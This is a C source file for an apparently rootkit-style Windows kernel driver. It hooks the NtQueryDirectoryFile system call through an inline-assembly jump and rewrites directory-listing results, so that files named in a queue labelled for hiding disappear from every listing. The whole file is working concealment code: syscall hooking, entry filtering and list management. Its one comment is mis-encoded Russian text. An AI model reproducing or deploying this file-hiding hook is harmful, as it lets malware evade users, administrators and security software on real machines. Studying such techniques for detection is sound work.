#include "file.h"

//
// ¬спомогательный макрос, осуществл€ющий единообразную фильтрацию в запросах
// к каталогам с разными структурами (все структуры содержат одинаковые пол€,
// необходимые дл€ фильтрации).
//
#define FILTER_LIST_DIR(EntryType, listDirBuffer, listDirSize, newListDirLength)   \
    {\
        EntryType *currentEntry = (EntryType*) listDirBuffer;\
        EntryType *lastEntry = NULL;\
        PCHAR copyPosition = (PCHAR) listDirBuffer;\
        while (TRUE) {\
			PLIST_ENTRY pLink; \
            ULONG_PTR copySize;\
            BOOL isHide = FALSE;\
			ULONG_PTR offset = currentEntry->NextEntryOffset; \
            if (offset == 0) {\
                copySize = listDirSize - (copyPosition - listDirBuffer);\
            }\
            else {\
                copySize = offset;\
            }\
    \
            \
            for(pLink = glTaskQueueFile.Flink; pLink != &glTaskQueueFile; pLink = pLink->Flink){\
                PTASK_QUEUE_FILE task = CONTAINING_RECORD(pLink, TASK_QUEUE_FILE, link);\
		        if (!wcsncmp(currentEntry->FileName, task->filename, currentEntry->FileNameLength / 2)) {\
		        \
                    newListDirLength -= copySize;\
                    if ( (currentEntry->NextEntryOffset == 0) && (lastEntry != NULL) ) {\
                        lastEntry->NextEntryOffset = 0;\
                    }\
                    isHide = TRUE;\
                    break;\
                }\
            }\
            if (!isHide) {\
		        \
                if (copyPosition != (PCHAR)currentEntry) {\
                    RtlCopyMemory (copyPosition, currentEntry, copySize);\
                }\
                lastEntry = currentEntry;\
                copyPosition += copySize;\
            }\
    \
            if (offset == 0) {\
                break;\
            }\
    \
            currentEntry = (EntryType*)((PCHAR)currentEntry + offset);\
        }\
    }

NTSTATUS NTAPI HookNtQueryDirectoryFile(
	HANDLE                 FileHandle,
	HANDLE                 Event,
	PIO_APC_ROUTINE        ApcRoutine,
	PVOID                  ApcContext,
	PIO_STATUS_BLOCK       IoStatusBlock,
	PVOID                  FileInformation,
	ULONG                  Length,
	FILE_INFORMATION_CLASS FileInformationClass,
	BOOLEAN                ReturnSingleEntry,
	PUNICODE_STRING        FileName,
	BOOLEAN                RestartScan
) {
	NTSTATUS retStatus;
	PCHAR listDirBuffer;
	ULONG_PTR newListDirLength;

	//retStatus = glRealNtQueryDirectoryFile(
	//	FileHandle,
	//	Event,
	//	ApcRoutine,
	//	ApcContext,
	//	IoStatusBlock,
	//	FileInformation,
	//	Length,
	//	FileInformationClass,
	//	ReturnSingleEntry,
	//	FileName,
	//	RestartScan
	//);
	++SyscallProcessedCount;

	retStatus = JmpNtQueryDirectoryFile(
		FileHandle,
		Event,
		ApcRoutine,
		ApcContext,
		IoStatusBlock,
		FileInformation,
		Length,
		FileInformationClass,
		ReturnSingleEntry,
		FileName,
		RestartScan
	);
	
	if (NT_SUCCESS(retStatus)) {

		listDirBuffer = FileInformation;
		newListDirLength = IoStatusBlock->Information;

		__try {
			switch (FileInformationClass) {
			case FileDirectoryInformation:
				//KdPrint(("FileDirectoryInformation\n"));
				FILTER_LIST_DIR(FILE_DIRECTORY_INFORMATION, listDirBuffer, IoStatusBlock->Information, newListDirLength);
				break;
			case FileFullDirectoryInformation:
				//KdPrint(("FileFullDirectoryInformation\n"));
				FILTER_LIST_DIR(FILE_FULL_DIR_INFORMATION, listDirBuffer, IoStatusBlock->Information, newListDirLength);
				break;
			case FileBothDirectoryInformation:
				//KdPrint(("FileBothDirectoryInformation\n"));
				FILTER_LIST_DIR(FILE_BOTH_DIR_INFORMATION, listDirBuffer, IoStatusBlock->Information, newListDirLength);
				break;
			case FileNamesInformation:
				//KdPrint(("FileNamesInformation\n"));
				FILTER_LIST_DIR(FILE_NAMES_INFORMATION, listDirBuffer, IoStatusBlock->Information, newListDirLength);
				break;
			case FileIdBothDirectoryInformation:
				//KdPrint(("FileIdBothDirectoryInformation\n"));
				FILTER_LIST_DIR(FILE_ID_BOTH_DIR_INFORMATION, listDirBuffer, IoStatusBlock->Information, newListDirLength);
				break;
			case FileIdFullDirectoryInformation:
				//KdPrint(("FileIdFullDirectoryInformation\n"));
				FILTER_LIST_DIR(FILE_ID_FULL_DIR_INFORMATION, listDirBuffer, IoStatusBlock->Information, newListDirLength);
				break;
			}
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
			DbgPrint("\n\nEXCEPTION FILE\n\n");
		}

		IoStatusBlock->Information = newListDirLength;
	}
	--SyscallProcessedCount;
	return retStatus;
}

__declspec(naked) NTSTATUS NTAPI JmpNtQueryDirectoryFile(
	HANDLE                 FileHandle,
	HANDLE                 Event,
	PIO_APC_ROUTINE        ApcRoutine,
	PVOID                  ApcContext,
	PIO_STATUS_BLOCK       IoStatusBlock,
	PVOID                  FileInformation,
	ULONG                  Length,
	FILE_INFORMATION_CLASS FileInformationClass,
	BOOLEAN                ReturnSingleEntry,
	PUNICODE_STRING        FileName,
	BOOLEAN                RestartScan
) {
	__asm {
		push ebp
		mov ebp, esp
		jmp [addressForJmpNtNtQueryDirectoryFile]
	}
}


//ULONG StrLenFilename(PCHAR str) {
//	ULONG i = 0;
//	while (str[i++] != '\0');
//	return i;
//}

PWCH AnsiToUnicodeFilename(char* str) {

	ANSI_STRING ansiStr;
	UNICODE_STRING uniStr;
	USHORT length;

	RtlInitAnsiString(&ansiStr, str);
	length = (USHORT)RtlAnsiStringToUnicodeSize(&ansiStr);
	uniStr.Buffer = (PWCH)ExAllocatePoolWithTag(PagedPool, length, 'oneN');
	uniStr.MaximumLength = length;
	RtlAnsiStringToUnicodeString(&uniStr, &ansiStr, FALSE);

	return uniStr.Buffer;
}

VOID TaskQueueByFilename(PCHAR filename) {
	if (filename != NULL) {
		PTASK_QUEUE_FILE task = (PTASK_QUEUE_FILE)ExAllocateFromPagedLookasideList(&glPagedTaskQueueFile);

		//ULONG len = StrLenFilename(filename);
		//task->filename = ExAllocatePoolWithTag(PagedPool, len * 2, 'oneN');
		//RtlCopyMemory(task->filename, filename, len);
		//task->filename[len] = '\0';
		task->filename = AnsiToUnicodeFilename(filename);

		InsertTailList(&glTaskQueueFile, &task->link);
	}
}

VOID FreeListQueueFilename() {

	while (!IsListEmpty(&glTaskQueueFile)) {
		PLIST_ENTRY pLink = RemoveHeadList(&glTaskQueueFile);
		PTASK_QUEUE_FILE task = CONTAINING_RECORD(pLink, TASK_QUEUE_FILE, link);
		if (task->filename) ExFreePool(task->filename);
		ExFreeToPagedLookasideList(&glPagedTaskQueueFile, task);
	}

}

VOID PrintTaskQueueFileList() {
	PLIST_ENTRY pLink;
	DbgPrint("TASK QUEUE FOR HIDE FILES\n");
	for (pLink = glTaskQueueFile.Flink; pLink != &glTaskQueueFile; pLink = pLink->Flink) {
		PTASK_QUEUE_FILE task = CONTAINING_RECORD(pLink, TASK_QUEUE_FILE, link);

		if (task->filename) {
			DbgPrint("NAME:%ws\n", (PCHAR)task->filename);
		}
	}
}